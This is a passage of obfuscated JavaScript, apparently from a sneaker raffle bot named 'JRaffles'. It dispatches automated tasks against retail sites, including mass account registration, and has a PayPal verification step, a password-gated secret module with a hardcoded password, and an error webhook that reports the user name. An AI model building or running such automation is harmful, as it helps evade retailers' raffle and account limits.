                                var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction], _0x5f59fc = await _0x169d17(), _0x2a60a3 = await _0xe9776e(_0x343003);
                                return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x2a60a3), await _0x343003['function'](_0x343003, _0x2a60a3, _0x5f59fc), await _0xa2099c(0x1388), _0x179beb();
                            } else {
                                if (_0xabefbd[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x5f59fc = await _0x169d17(), _0x5bf8aa = await _0xe9776e(_0x343003);
                                        return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x5bf8aa), await _0x343003['function'](_0x343003, _0x5bf8aa, _0x5f59fc), _0x179beb();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x5f59fc = await _0x169d17();
                                            return await _0x343003['function'](_0x343003, null, _0x5f59fc), _0x179beb();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0xabefbd[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                        var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x343003);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0xabefbd[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                            var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5f59fc = await _0x169d17(), _0x53b252 = await _0xe9776e(_0x343003);
                                                return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x53b252), await _0x343003['function'](_0x343003, _0x53b252, _0x5f59fc), _0x179beb();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5f59fc = await _0x169d17(), _0x53b252 = await _0xe9776e(_0x343003);
                                                    return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x53b252), await _0x343003['function'](_0x343003, _0x53b252, _0x5f59fc), _0x179beb();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0xabefbd[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                                var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5f59fc = await _0x169d17(), _0x3864e6 = await _0xe9776e(_0x343003);
                                                    return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x3864e6), await _0x343003['function'](_0x343003, _0x3864e6, _0x5f59fc), _0x179beb();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5f59fc = await _0x169d17(), _0x3864e6 = await _0xe9776e(_0x343003);
                                                        return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x3864e6), await _0x343003['function'](_0x343003, _0x3864e6, _0x5f59fc), _0x179beb();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0xabefbd[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5f59fc = await _0x169d17(), _0x22b750 = await _0xe9776e(_0x343003);
                                                        return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x22b750), await _0x343003['function'](_0x343003, _0x22b750, _0x5f59fc), _0x179beb();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x5f59fc = await _0x169d17(), _0x22b750 = await _0xe9776e(_0x343003);
                                                            return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0x22b750), await _0x343003['function'](_0x343003, _0x22b750, _0x5f59fc), _0x179beb();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0xabefbd[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                                        var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x5f59fc = await _0x169d17(), _0xbe9263 = await _0xe9776e(_0x343003);
                                                            return _0x2795a0['shuffleTasks'] && await _0x48cb15(_0xbe9263), await _0x343003['function'](_0x343003, _0xbe9263, _0x5f59fc), _0x179beb();
                                                        }
                                                    } else {
                                                        if (_0xabefbd[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0xa2099c(0x3e8), _0x179beb();
                                                        else {
                                                            if (_0xabefbd[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x45a5a4 = _0xabefbd[taskModule]['name'], _0x5f59fc = await _0x169d17();
                                                                return await _0x501e78(_0x45a5a4, _0x5f59fc), _0x179beb();
                                                            } else {
                                                                if (_0xabefbd[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x4b8bdf(_0xabefbd[taskModule]['modules']);
                                                                    var _0x343003 = _0xabefbd[taskModule]['modules'][taskFunction];
                                                                    return await _0x343003['function'](_0x343003), _0x179beb();
                                                                } else {
                                                                    if (_0xabefbd[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x193dc6 = 0x0;
                                                                        for (const _0x2165c2 in _0x2795a0) {
                                                                            console['log']('(' + _0x193dc6 + ')\x20' + _0x2165c2 + '\x20:\x20' + _0x2795a0[_0x2165c2]), _0x193dc6++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x193dc6 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0xa8dee8 = await _0x1a45cc();
                                                                        if (_0xa8dee8 == _0x193dc6)
                                                                            return _0x179beb();
                                                                        console['clear'];
                                                                        var _0x32bb52 = 0x0;
                                                                        for (var _0x471d7a in _0x2795a0) {
                                                                            if (_0xa8dee8 == _0x32bb52) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x471d7a + '\x20:'), _0x2795a0[_0x471d7a] = await _0x3ccd9f(), _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0));
                                                                                break;
                                                                            } else
                                                                                _0x32bb52++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0xa2099c(0xbb8), _0x179beb();
                                                                    } else {
                                                                        if (_0xabefbd[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x37ec9c(), _0x179beb();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0xabefbd[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x880896 = await _0x1cc83a();
                                                                                _0x880896 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x4f2993(), await afewFunction(_0x5c9608[_0x232c55], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xa2099c(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x179beb();
            } catch (_0x4d419d) {
                return console['log'](_0x4d419d), await _0xa2099c(0x2710), _0x179beb();
            }
        } catch (_0x51a4a3) {
            return console['log'](_0x51a4a3), await _0xa2099c(0x3a98);
        }
}
;
_0x215576('JRaffles\x20' + _0x39dec1);
try {
    _0x37ec9c(), _0x35ebde();
} catch (_0x3e23e2) {
    var _0x20d25d = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x1bdb7f
            },
            {
                'name': 'Version',
                'value': '' + _0x39dec1
            },
            {
                'name': 'Error',
                'value': '' + _0x3e23e2
            }
        ]
    }];
    const _0x9b561c = { 'embeds': _0x20d25d };
    _0x310f97(_0x281108, _0x9b561c);
}